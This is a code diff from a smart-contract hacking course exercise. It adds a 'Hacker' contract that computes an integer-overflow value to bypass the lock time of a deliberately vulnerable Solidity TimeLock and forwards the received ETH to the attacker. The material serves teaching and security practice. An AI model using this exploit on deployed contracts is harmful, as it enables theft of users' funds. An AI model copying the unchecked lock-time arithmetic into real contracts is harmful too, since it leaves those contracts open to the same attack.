@@ -2,34 +2,61 @@
 // https://smartcontractshacking.com/#copyright-policy
 pragma solidity ^0.7.0;
 
+import "hardhat/console.sol";
+
 /**
  * @title TimeLock
  * @author JohnnyTime (https://smartcontractshacking.com)
  */
 contract TimeLock {
-    mapping(address => uint) public getBalance;
-    mapping(address => uint) public getLocktime;
+  mapping(address => uint) public getBalance;
+  mapping(address => uint) public getLocktime;
 
-    constructor() {}
+  constructor() {}
 
-    function depositETH() public payable {
-        getBalance[msg.sender] += msg.value;
-        getLocktime[msg.sender] = block.timestamp + 30 days;
-    }
+  function depositETH() public payable {
+    getBalance[msg.sender] += msg.value;
+    getLocktime[msg.sender] = block.timestamp + 30 days;
+  }
 
-    function increaseMyLockTime(uint _secondsToIncrease) public {
-        getLocktime[msg.sender] += _secondsToIncrease;
-    }
+  function increaseMyLockTime(uint _secondsToIncrease) public {
+    getLocktime[msg.sender] += _secondsToIncrease;
+  }
 
-    function withdrawETH() public {
+  function withdrawETH() public {
+    require(getBalance[msg.sender] > 0, "Balance is 0");
+    require(
+      block.timestamp > getLocktime[msg.sender],
+      "You cannot remove funds yet"
+    );
 
-        require(getBalance[msg.sender] > 0);
-        require(block.timestamp > getLocktime[msg.sender]);
+    uint transferValue = getBalance[msg.sender];
+    getBalance[msg.sender] = 0;
 
-        uint transferValue = getBalance[msg.sender];
-        getBalance[msg.sender] = 0;
+    (bool sent, ) = msg.sender.call{ value: transferValue }("");
+    require(sent, "Failed to send ETH");
+  }
+}
 
-        (bool sent, ) = msg.sender.call{value: transferValue}("");
-        require(sent, "Failed to send ETH");
-    }
+contract Hacker {
+  TimeLock timelock;
+  address payable owner;
+
+  constructor(address _timemock) {
+    timelock = TimeLock(_timemock);
+    owner = payable(msg.sender);
+  }
+
+  function removeTimeLock() external view returns (uint256) {
+    uint maxNUmber = type(uint256).max;
+    uint timeLockVictim = timelock.getLocktime(msg.sender);
+    uint attackNumber = maxNUmber - timeLockVictim;
+
+    return attackNumber;
+  }
+
+  receive() external payable {
+    (bool success, ) = owner.call{ value: address(this).balance }("");
+    require(success, "Tranfer to Attacker Failed");
+  }
 }
